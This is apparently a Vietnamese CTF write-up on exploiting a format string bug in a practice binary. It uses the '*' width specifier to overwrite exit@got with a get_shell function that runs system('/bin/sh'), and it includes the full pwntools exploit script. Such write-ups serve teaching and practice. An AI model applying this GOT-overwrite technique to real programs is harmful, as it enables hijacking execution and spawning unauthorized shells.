# Format String - Định dạng con "*"

***1 kiến thức mới trong fmtstr***

ida:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/16af1bb5-3633-403d-9e44-c95a5e996ed0)



![image](https://github.com/gookoosss/CTF.-/assets/128712571/0d736f89-5ef5-426b-b29e-14980b76eab3)


**để ý thì ko có lỗi BOF, chỉ có lỗi fmtstr, kết thúc hàm main bằng exit nên ret2libc là ko thể**

checks:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/52ac73b6-e618-48fb-875e-18d3b2869f0e)


đọc ida ta thấy **có 3 lần nhập receiver, title, content**, h ta sẽ khai thác 3 lần nhập:

- **ở lần nhập 1 có lỗi fmtstr** nma đến cuối chương trình mới printf ra, tạm thời ta bỏ qua
- ở lần nhập 2 thì debug ta thấy sau title có 1 địa chỉ rác, **nếu nhập đủ 32byte ta có thể leak được địa chỉ này, từ đó tính offset ra địa chỉ exe**


![image](https://github.com/gookoosss/CTF.-/assets/128712571/46f22503-5810-4af9-872b-0f46ad0d7b86)


![image](https://github.com/gookoosss/CTF.-/assets/128712571/e599b213-07d2-4ff2-9081-f5d323956cca)



- ở lần nhập 3 không khai thác được gì cả

đến đây ta chỉ mới leak được địa chỉ exe 

ta để ý thì thấy **Relro tắt**, đằng sau printf có lỗi **fmtstr** chỉ có **exit()**, mà trong hàm **get_shell** thì lại có hàm  **system("/bin/sh")**, nên ta nhảy số ngay về hướng giải ```tấn công GOT là overwrite exit@got thành get_shell```

![image](https://github.com/gookoosss/CTF.-/assets/128712571/9e4be665-9fa0-436a-a1b8-42c226e9946a)


**địa chỉ got@exit với get_shell chỉ khác nhau 2 byte cuối nên ta có thể in 1 lần luôn**

**vấn đề xảy ra** là ở lần nhập đầu ta nhập cho **receiver có lỗi fmtstr**, nhưng mà tới lần nhập 2 ta mới **leak được địa chỉ của exe**, chương trình thì ko thể lặp lại do có exit, nên tại lần nhập đầu ta ko thể dùng địa chỉ của hàm get_shell bằng **exe.sym['get_shell']** để in ra số byte gần gán và **got@exit** 

**bây giờ ta chỉ có thể sử dụng địa chỉ get_shell tại lần nhập 3**, lúc này ta cần biết 1 kiến thức mới đó con "*"



## Giới thiệu qua về con *

*ví dụ:*

![image](https://github.com/gookoosss/CTF.-/assets/128712571/674e18de-e15c-4d8a-8612-185e0eb30353)



**hiểu đơn giản là * trỏ đến giá trị nào thì nó sẽ in ra số byte bằng với giá trị đó** 

``` ==> Khi không biết được cần phải pad bao nhiêu byte, ta có thể dùng định dạng con "*" giúp in ra số byte mà định dạng trỏ tới. ```

**tới đây ta có hướng giải như sau:**

- lợi dụng lần nhập 3 có thể sử dụng được địa chỉ get shell nên ta sẽ đặt 2 byte cuối get shell lên stack, stack tiếp theo ta đặt địa chỉ got@exit
- lần nhập 1 có fmtstr ta sẽ sử dụng con * để trỏ đến stack chứa 2byte cuối của get shell để in ra số lần đó, từ đó ta có padding để overwrite got@exit thành địa chỉ của get shell

bây giờ ta sẽ debug thử xem sao:

![image](https://github.com/gookoosss/CTF.-/assets/128712571/eb6657ce-a8d7-4972-91c7-16e217b1e4f5)


**trước khi printf thì ta thấy stack 0x040 chứa 2 byte cuối của get_shell là 0xa2b7**

![image](https://github.com/gookoosss/CTF.-/assets/128712571/061167ac-3471-4cab-abd7-b23b5b144157)


**sau khi printf thì got@exit đã trỏ đến địa chỉ của hàm get_shell rồi chứng tỏ ta đã làm đúng rồi đó**

(trong script có note)

**script:**

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./fmtstr7_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
p = process([exe.path])

context.binary = exe

gdb.attach(p, gdbscript = '''
b*main+343
c
''')
           
input()

##################################
### stage 1: format string     ###
##################################

payload = b'%*14$c%15$hn'# dùng con * để pad đủ 2 byte cuối của get_shell rồi gán vào 2 byte cuối của exit
p.sendafter(b'Receiver: ', payload)

##################################
### stage 2 : leak exe address ###
##################################

p.sendafter(b'Title: ', b'a'*0x20) # chèn 32byte
p.recvuntil(b'a'*32) # bỏ qua 32byte
exe_leak = u64(p.recv(6) + b'\0\0') # lấy 6byte sau
exe.address = exe_leak - 0x40
log.info("exe leak: " + hex(exe_leak))
log.info("exe base: " + hex(exe.address))

#####################################################
### stage 3 : overwrite exit@got into get_shell() ###
#####################################################


payload = p64(exe.sym['get_shell'] & 0xffff) # lấy 2 byte cuối get_shell để vào stack
payload += p64(exe.got['exit']) 
p.sendafter(b'Content: ', payload)

p.interactive()





```



